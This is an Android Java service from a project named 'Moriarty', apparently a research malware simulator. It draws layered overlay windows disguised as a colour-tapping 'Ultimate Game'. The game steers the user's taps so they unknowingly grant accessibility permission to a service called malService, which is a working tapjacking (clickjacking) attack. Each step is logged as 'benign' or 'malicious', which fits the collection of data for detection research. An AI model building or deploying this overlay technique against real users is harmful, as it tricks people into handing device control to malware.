package com.bgu.sherlock.Moriarty;


import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.provider.Settings;
//import android.support.annotation.Nullable;
//import androidx.core.content.LocalBroadcastManager;
import androidx.annotation.Nullable;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.util.ArrayList;
import java.util.Random;


public class TopService extends Service  {

    private WindowManager windowManager;
    private ImageView track;
    private ImageView track2;
    private ImageView back;
    private ImageView front;
    private Button btnStart;

    private TextView TLeft;
    private TextView Tpat;

    private ImageView Red;
    private ImageView Green;
    private ImageView Yellow;
    private ImageView Purple;


    private ImageView Top;
    private ImageView Bottom;
    private ImageView Left;
    private ImageView Right;

    private int canTouch = -1;
    private int level = 2;


    private Clues clue = new Clues();
    private WindowManager.LayoutParams params;
    private static String TAG="Moriarty";

    private String levelString = "";
    private String pressedString = "";
    private ArrayList<ImageView> squares = new ArrayList<>();

    private BroadcastReceiver mbroadcast = new MyBroadCastReciever();

    private void Initparams(boolean touchable){
        if (touchable) {

            params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_TOAST,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                    PixelFormat.TRANSLUCENT);
        }
       else {
            params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_TOAST,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,

            PixelFormat.TRANSLUCENT);
        }
        params.gravity = Gravity.TOP | Gravity.LEFT;
        params.x = 0;
        params.y = 0;
    }

    private boolean safeAdd(View view){
        try{
            /*if (view instanceof ImageView)
                ((ImageView)view).setAlpha(100);*/
            windowManager.addView(view,params);
        } catch (Exception e){
            Log.e(TAG,e.getMessage());
            return false;
        }
        return true;
    }

    private boolean safeRemove(View view){
        try{
            windowManager.removeView(view);
        } catch (Exception e){
            Log.e(TAG,"failed remove " + view.toString());
            return false;
        }
        return true;
    }


    private void InitializeViews(){
        Top = new ImageView(this);
        Top.setImageResource(R.drawable.back);
        Bottom = new ImageView(this);
        Bottom.setImageResource(R.drawable.back);
        Left = new ImageView(this);
        Left.setImageResource(R.drawable.back);
        Right = new ImageView(this);
        Right.setImageResource(R.drawable.back);

        front = new ImageView(this);
        front.setImageResource(R.drawable.back);
        back = new ImageView(this);
        back.setImageResource(R.drawable.back);
        track = new ImageView(this);
        track.setImageResource(R.drawable.track);
        track2 = new ImageView(this);
        track2.setImageResource(R.drawable.track);

        Red = new ImageView(this);
        Red.setImageResource(R.drawable.red);
        Red.setAlpha(0f);

        Green = new ImageView(this);
        Green.setImageResource(R.drawable.green);
        Green.setAlpha(0f);

        Yellow = new ImageView(this);
        Yellow.setImageResource(R.drawable.yellow);
        Yellow.setAlpha(0f);

        Purple = new ImageView(this);
        Purple.setImageResource(R.drawable.purple);
        Purple.setAlpha(0f);


        Top.setScaleType(ImageView.ScaleType.FIT_XY);
        Bottom.setScaleType(ImageView.ScaleType.FIT_XY);
        Left.setScaleType(ImageView.ScaleType.FIT_XY);
        Right.setScaleType(ImageView.ScaleType.FIT_XY);




        params.height = 1200;
        safeAdd(Top);

        params.y = 1400;
        params.height = 520;
        safeAdd(Bottom);

        int leftadd=0;
        if (Build.VERSION.SDK_INT == 19)
            leftadd = -70;
        params.y=0;
        params.height = WindowManager.LayoutParams.WRAP_CONTENT;
        params.width = 820 + leftadd;
        safeAdd(Left);

        params.x = 970+leftadd;
        params.width = 110-leftadd;
        safeAdd(Right);





        track.setAlpha(1f);
        back.setAlpha(1f);
        Initparams(false);
        safeAdd(back);


        params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE  | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH| WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        params.width = 800;
        params.height = 400;
        params.x = 200;
        params.y = 1300;
        TLeft = new TextView(this);
        Tpat = new TextView(this);

        params.width = 100;
        params.height = 100;
        params.x = 100;
        params.y = 1700;
        safeAdd(Red);
        params.x = 950;
        params.y = 40;
        safeAdd(Green);
        params.x = 500;
        params.y = 1200;
        safeAdd(Purple);
        params.x = 200;
        params.y = 600;
        safeAdd(Yellow);

        Initparams(false);
        track.setAlpha(0f);
        safeAdd(track);
        track.setAlpha(0f);
        Initparams(true);
        track2.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View view, MotionEvent motionEvent) {
                safeRemove(track2);
                TLeft.setTextSize(60);
                TLeft.setTextColor(Color.RED);
                TLeft.setText("");

                new CountDownTimer(8000, 100) {

                    public void onTick(long millisUntilFinished) {
                        TLeft.setText(""+ millisUntilFinished/1000);

                    }

                    public void onFinish() {

                        canTouch = 1;
                        TLeft.setTextSize(20);
                        TLeft.setTextColor(Color.BLUE);
                        TLeft.setText("Great! Now touch in the following order: Red,Green");

                        Initparams(false);

                        params.gravity = Gravity.TOP | Gravity.LEFT;
                        params.width = 900;
                        params.height = 400;
                        params.x = 100;
                        params.y = 300;


                            safeRemove(TLeft);

                        safeAdd(TLeft);
                        Red.setAlpha(1f);
                        Green.setAlpha(1f);
                        Yellow.setAlpha(1f);
                        Purple.setAlpha(1f);


                            safeRemove(track);

                    }
                }.start();
                return false;
            }
        });
        safeAdd(track2);


        Initparams(true);
        safeAdd(front);

        btnStart = new Button(this);
        btnStart.setText("Start");
        params.x = 500;
        params.y = 800;
        safeAdd(btnStart);

        TLeft.setTextSize(20);
        TLeft.setText("Welcome to the Ultimate Game");
        TLeft.setTextColor(Color.YELLOW);
        params.x = 150;
        params.y = 1200;
        params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE  | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH| WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        safeAdd(TLeft);
    }

    @Override public void onCreate() {
        super.onCreate();
        clue.updateLastEntrance();
        IntentFilter inF = new IntentFilter("goRand");
        inF.addAction("android.intent.action.SCREEN_OFF");
        LocalBroadcastManager.getInstance(this).registerReceiver(mbroadcast,inF);
        Singleton.getInstance().shouldAccess = isAccessibilitySettingsOn(this);
        Log.e(TAG,"service has access? " + Singleton.getInstance().shouldAccess);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        Initparams(false);


        clue.SendMal( "View Change","Entered to game view","Clickjacking[" +  Singleton.getInstance().clickJacking + "]","benign");



//        registerReceiver(rec, new IntentFilter(Intent.ACTION_SCREEN_OFF));

        HomeWatcher mHomeWatcher = new HomeWatcher(this);
        mHomeWatcher.setOnHomePressedListener(new OnHomePressedListener() {
            @Override
            public void onHomePressed() {
                Singleton.getInstance().sHome = true;

                stopSelf();
                Log.e(TAG,"Home pressed");
            }
            @Override
            public void onHomeLongPressed() {
            }
        });
        mHomeWatcher.startWatch();


        InitializeViews();


        LinearLayout mDummyView = new LinearLayout(this);

        params = new WindowManager.LayoutParams(1, WindowManager.LayoutParams.MATCH_PARENT);
        mDummyView.setLayoutParams(params);
        mDummyView.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View view, MotionEvent motionEvent) {
                Log.e(TAG,"Touch event.." + canTouch);
                switch (canTouch){
                    case 1:
                        safeRemove(Red);
                        canTouch++;
                        return false;
                    case 2:
                        safeRemove(Green);
                        canTouch++;
                        if(!isAccessibilitySettingsOn(getApplicationContext())) {
                            safeRemove(back);
                        }
                        else{
                            int leftadd = 0;
                            int topadd = 0;
                            if (Build.VERSION.SDK_INT == 19) {
                                leftadd = -650;
                                topadd = 200;
                            }
                            canTouch = 10;
                            safeRemove(Yellow);
                            Yellow.setImageResource(R.drawable.ok);
                            Initparams(false);
                            params.x = 820 + leftadd;
                            params.y = 1060 + topadd;
                            safeAdd(Yellow);
                        }
                        TLeft.setTextColor(Color.rgb(230,110,30));
                        TLeft.setText("Awesome! Proceed to the next level..");

                        return false;
                    case 3:
                        canTouch++;
                        CountDownTimer cdt = new CountDownTimer(1000,500) {
                            @Override
                            public void onTick(long l) {

                            }

                            @Override
                            public void onFinish() {
                                if (!isAccessibilitySettingsOn(getApplicationContext()))
                                {
                                    Initparams(true);
                                    safeRemove(TLeft);
                                    safeAdd(back);
                                    TLeft.setText("You Lose! try to follow the instructions more carefully next time");
                                    params.x = 100;
                                    params.y = 400;
                                    safeAdd(TLeft);
                                    btnStart.setText("Exit");
                                    btnStart.setOnClickListener(new View.OnClickListener() {
                                        @Override
                                        public void onClick(View view) {
                                            sendBroadcast(new Intent("xyz"));
                                            Log.e(TAG,"Exiting...");
                                            removeAll();
                                            stopSelf();

                                        }
                                    });
                                    params.x = 300;
                                    params.y = 600;
                                    safeAdd(btnStart);

                                }
                            }
                        };
                        cdt.start();
                        return false;
                    case 10:
                        try {
                            Thread.sleep(800);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        if (!isAccessibilitySettingsOn(getApplicationContext())) {
                            MyApp.sessionId++;
                            SharedPreferences settings = getSharedPreferences("MoriartySession", 0);
                            SharedPreferences.Editor editor = settings.edit();
                            editor.putInt("Moriarty", MyApp.sessionId);
                            editor.commit();

                            clue.SendMal("Accessibility Permissions","Malicious Service Has been Revoked Accessibility Permissions","Clickjacking[" + Singleton.getInstance().clickJacking +"]","malicious");
                            Singleton.getInstance().clickJacking = "ON";
                        }
                        continueRand();
                        canTouch++;
                        return false;

                }
                return false;
            }
        });


        WindowManager.LayoutParams params2 = new WindowManager.LayoutParams(
                1, /* width */
                1, /* height */
                WindowManager.LayoutParams.TYPE_TOAST,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSPARENT
        );
        params2.gravity = Gravity.LEFT | Gravity.TOP;
        windowManager.addView(mDummyView, params2);

        btnStart.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Singleton.getInstance().mBool = true;
                track.setAlpha(1f);
                safeRemove(btnStart);
                safeRemove(front);
                TLeft.setText("In this challenge you will have to follow the presented track in 8 seconds." +
                        " When you are ready, Touch anywhere to start");

            }
        });
    }


    private void continueRand(){
        try{
            Random rr = new Random();
            safeRemove(Yellow);
            Yellow.setImageResource(R.drawable.yellow);
            Log.e(TAG,"continuing randomly, level " + String.valueOf(level));
            clue.SendMal( "View Change", "Entered to Level " + level + " view","Clickjacking[" +  Singleton.getInstance().clickJacking + "]","benign");
            Initparams(true);

            safeRemove(TLeft);
            TLeft.setText("Level " + level);
            TLeft.setTextSize(50);
            TLeft.setTextColor(Color.BLUE);

            Tpat.setTextColor(Color.rgb(230,110,30));
            Tpat.setTextSize(20);

            safeAdd(front);
            params.x = 100;

            params.y =100;
            safeAdd(TLeft);
            levelString = "";
            pressedString = "";
            squares = new ArrayList<ImageView>();

            params.x = 20;
            params.y = 600;
            params.height = 500;
            safeAdd(Tpat);

            ImageView squarei;
            params.width = 150;
            params.height = 150;
            for (int i =0;i<level+1;i++){
                squarei = new ImageView(this);
                int cc = rr.nextInt(4)+1;
                String col = "";
                switch (cc) {
                    case 1:
                        squarei.setImageResource(R.drawable.red);
                        levelString = ",red" + levelString;
                        col = "red";
                        break;
                    case 2:
                        squarei.setImageResource(R.drawable.green);
                        levelString = ",green" + levelString;
                        col = "green";
                        break;
                    case 3:
                        squarei.setImageResource(R.drawable.yellow);
                        levelString = ",yellow" + levelString;
                        col = "yellow";
                        break;
                    case 4:
                        squarei.setImageResource(R.drawable.purple);
                        levelString = ",purple" + levelString;
                        col = "purple";
                        break;
                }
                int sx = Integer.valueOf(String.valueOf(Math.round(Math.random()*850)));
                int sy = Integer.valueOf(String.valueOf(Math.round(Math.random()*1800)));
                params.x = sx;
                params.y = sy;
                safeAdd(squarei);
                squares.add(squarei);
                final String finalCol = col;

                squarei.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        pressedString += "," + finalCol;
                        safeRemove(view);
                        Log.e(TAG,pressedString);
                        if (levelString.equals(pressedString))
                        {
                            level++;
                            for (ImageView sq:squares){

                                safeRemove(sq);

                            }
                            continueRand();
                        }
                        else if(!levelString.equals(pressedString) && levelString.length()==pressedString.length())
                        {
                            TLeft.setText("Wrong pattern! Game Over");
                            btnStart.setText("Exit");
                            btnStart.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {
                                    Log.e(TAG,"exit pressed");
                                    removeAll();
                                    stopSelf();

                                }
                            });
                            params.x = 400;
                            params.y = 800;
                            safeAdd(btnStart);
                        }
                    }
                });

           /* params.width = WindowManager.LayoutParams.WRAP_CONTENT;
            params.height=WindowManager.LayoutParams.WRAP_CONTENT;
            params.x = 20;
            params.y = 600;
            */
                Tpat.setText("Touch in the following order: " + levelString);
                //safeAdd(Tpat);
            }
            Log.e(TAG,levelString);
        }catch(IllegalStateException e){
            Log.e(TAG,"IllegalStateException in continueRand(): "+ e.getMessage());
        }

    }

    public void removeAll(){
        Log.e(TAG,"Removig all views");

            safeRemove(track);
            safeRemove(Tpat);
            safeRemove(track2);
            safeRemove(back);
            safeRemove(front);

            safeRemove(btnStart);

            safeRemove(Green);
            safeRemove(Red);
            safeRemove(Purple);
            safeRemove(Yellow);

            safeRemove(Top);
            safeRemove(Left);
            safeRemove(Right);
            safeRemove(Bottom);

            safeRemove(TLeft);

            for (ImageView sq:squares){
                    safeRemove(sq);
            }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Singleton.getInstance().sHome = true;
        LocalBroadcastManager.getInstance(this).unregisterReceiver(mbroadcast);
        removeAll();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }








    public class MyBroadCastReciever extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            Log.e(TAG,"Action " + intent.getAction().toString());
            if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                Log.e(TAG,"Screen went OFF");
                ((Service)context).stopSelf();

            }
            else if (intent.getAction().equals("goRand")){

                continueRand();

            }
        }
    }

    private boolean isAccessibilitySettingsOn(Context mContext) {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + malService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    mContext.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
           // Log.v(TAG, "accessibilityEnabled = " + accessibilityEnabled);
        } catch (Settings.SettingNotFoundException e) {
            //Log.e(TAG, "Error finding setting, default accessibility to not found: "
            //        + e.getMessage());
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            //Log.v(TAG, "***ACCESSIBILITY IS ENABLED*** -----------------");
            String settingValue = Settings.Secure.getString(
                    mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();

                    //Log.v(TAG, "-------------- > accessibilityService :: " + accessibilityService + " " + service);
                    if (accessibilityService.equalsIgnoreCase(service)) {
                      //  Log.v(TAG, "We've found the correct setting - accessibility is switched on!");
                        Singleton.getInstance().clickJacking = "OFF";
                        return true;
                    }
                }
            }
        } else {
           Log.v(TAG, "***ACCESSIBILITY IS DISABLED***");
        }
        Singleton.getInstance().clickJacking = "ON";
        return false;
    }
}